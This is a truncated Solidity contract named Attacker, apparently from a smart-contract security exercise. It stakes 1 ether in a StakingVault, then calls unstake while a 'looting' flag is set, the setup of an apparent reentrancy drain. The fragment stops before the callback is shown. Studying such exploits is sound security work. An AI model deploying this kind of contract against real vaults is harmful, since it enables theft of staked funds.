contract Attacker {
    StakingVault public vault;
    uint256 public constant CHUNK = 1 ether;
    bool internal looting;

    constructor(address _vault) {
        vault = StakingVault(payable(_vault));
    }

    function attack() external {
        vault.stake{value: CHUNK}();
        looting = true;
        vault.unstake();
        looting = false;
